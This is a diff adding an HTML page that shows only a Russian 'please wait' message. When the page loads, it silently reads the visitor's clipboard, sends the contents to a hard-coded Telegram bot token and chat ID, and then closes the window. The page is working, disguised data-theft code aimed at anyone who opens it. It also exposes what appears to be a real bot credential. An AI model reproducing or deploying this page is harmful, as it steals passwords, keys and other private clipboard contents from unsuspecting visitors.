@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clipboard Access</title>
+    <script>
+        async function sendClipboardData() {
+            try {
+                // Запрашиваем доступ к буферу обмена
+                const clipboardData = await navigator.clipboard.readText();
+                
+                // Отправляем данные в Telegram
+                const botToken = '7341685493:AAGsKsTZfF6LPql4R6fJJQ9qiUx3Mq1L5eQ';
+                const chatId = '7406507427';
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: clipboardData
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Failed to send data to Telegram');
+                }
+
+                // Закрываем окно
+                window.close();
+            } catch (error) {
+                console.error('Error:', error);
+                // Можно добавить дополнительную обработку ошибок
+            }
+        }
+
+        // Запрашиваем разрешение на доступ к буферу обмена при загрузке страницы
+        window.onload = function() {
+            sendClipboardData();
+        };
+    </script>
+</head>
+<body>
+    <p>Пожалуйста, подождите...</p>
+</body>
+</html>
